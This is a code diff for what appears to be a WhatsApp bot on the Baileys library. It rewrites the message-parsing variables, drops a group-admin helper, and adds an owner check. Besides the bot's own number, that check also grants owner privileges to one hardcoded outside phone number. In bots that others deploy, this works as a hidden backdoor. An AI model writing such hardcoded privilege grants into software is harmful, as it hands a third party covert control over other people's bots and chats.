@@ -71,27 +71,24 @@ console.log(prefix);
 //========================================================================================================================//
 //========================================================================================================================//	  
     const Heroku = require("heroku-client");  
-    const command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase();
-    const args = body.trim().split(/ +/).slice(1);
-    const pushname = m.pushName || "No Name";
-    const botNumber = await client.decodeJid(client.user.id);
-    const itsMe = m.sender == botNumber ? true : false;
-    let text = (q = args.join(" "));
-    const arg = budy.trim().substring(budy.indexOf(" ") + 1);
-    const arg1 = arg.trim().substring(arg.indexOf(" ") + 1);
-    m.isBaileys = m.id.startsWith("BAE5") && m.id.length === 16;
-    const from = m.chat;
-    const reply = m.reply;
-    const sender = m.sender;
-    const mek = chatUpdate.messages[0];
-//========================================================================================================================//	  
-    const getGroupAdmins = (participants) => { 
-       let admins = []; 
-       for (let i of participants) { 
-         i.admin === "superadmin" ? admins.push(i.id) : i.admin === "admin" ? admins.push(i.id) : ""; 
-       } 
-       return admins || []; 
-     };
+const command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase();
+const args = body.trim().split(/ +/).slice(1);
+const pushname = m.pushName || "No Name";
+const botNumber = await client.decodeJid(client.user.id);
+const itsMe = m.sender == botNumber ? true : false;
+let text = (q = args.join(" "));
+const arg = budy.trim().substring(budy.indexOf(" ") + 1);
+const arg1 = arg.trim().substring(arg.indexOf(" ") + 1);
+m.isBaileys = m.id.startsWith("BAE5") && m.id.length === 16;
+const from = m.chat;
+const reply = m.reply;
+const sender = m.sender;
+const mek = chatUpdate.messages[0];
+
+const ownerNumber = botNumber.replace(/[^0-9]/g, ""); 
+const senderNumber = sender.split("@")[0];            
+
+const isOwner = senderNumber === ownerNumber || senderNumber === "254752818245";
 //========================================================================================================================//
 //========================================================================================================================//	  
     const nicki = (m.quoted || m); 
